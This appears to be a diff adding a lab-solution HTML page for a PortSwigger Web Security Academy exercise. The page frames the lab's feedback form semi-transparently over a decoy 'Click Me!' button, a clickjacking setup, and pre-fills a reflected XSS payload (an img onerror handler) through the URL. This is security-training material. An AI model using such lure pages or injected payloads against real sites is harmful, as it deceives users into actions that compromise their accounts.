@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Free Car!!!</title>
+    <style>
+        #target_site {
+            position: relative;
+            height: 820px;
+            width: 700px;
+            z-index: 2;
+            opacity: 0.5;
+        }
+
+        #decoy_site {
+            position: absolute;
+            z-index: 1;
+            top: 805px;
+            left: 50px;
+        }
+    </style>
+</head>
+<body>
+    <div id="decoy_site">
+        <button>Click Me!</button>
+    </div>
+    <iframe id="target_site" src="https://[LAB_SUB_DOMAIN].web-security-academy.net/feedback?name=%3Cimg src=1 onerror=print()>&email=example@example.com&subject=hello&message=world"></iframe>
+</body>
+</html>
